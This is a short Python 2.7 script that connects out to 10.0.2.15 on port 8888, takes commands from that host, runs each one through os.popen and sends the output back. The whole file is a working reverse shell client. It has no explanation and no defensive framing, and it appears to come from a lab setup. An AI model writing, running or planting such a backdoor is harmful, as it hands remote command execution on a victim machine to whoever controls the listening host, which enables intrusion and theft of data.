#!/usr/bin/python2.7
# Notice that we have to use os library instead of subprocess because subprocess wont work with windows

import socket, os

host = "10.0.2.15"
port = 8888

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((host, port))


while True:
    command = sock.recv(1024)
    for line in os.popen(command):
        sock.send(line)
        